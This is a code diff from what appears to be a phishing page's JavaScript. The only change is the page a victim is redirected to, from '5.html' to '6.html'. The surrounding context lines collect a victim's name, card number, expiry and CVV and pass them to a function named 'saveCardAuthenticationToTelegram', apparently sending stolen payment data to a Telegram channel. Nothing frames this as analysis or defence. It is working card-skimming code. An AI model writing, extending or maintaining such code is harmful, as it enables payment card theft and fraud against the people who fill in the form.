@@ -78,7 +78,7 @@
     submitBtn.textContent = "Processing...";
     try {
       const res = await saveCardAuthenticationToTelegram({ name, cardNumber, expiry, cvv });
-      if (res.success) setTimeout(() => window.location.href = "5.html", 500);
+      if (res.success) setTimeout(() => window.location.href = "6.html", 500);
       else { alert("Error: " + (res.error || "Failed")); submitBtn.disabled = false; submitBtn.textContent = "PROCEED NOW"; }
     } catch (err) { alert("Error: " + err.message); submitBtn.disabled = false; submitBtn.textContent = "PROCEED NOW"; }
   });
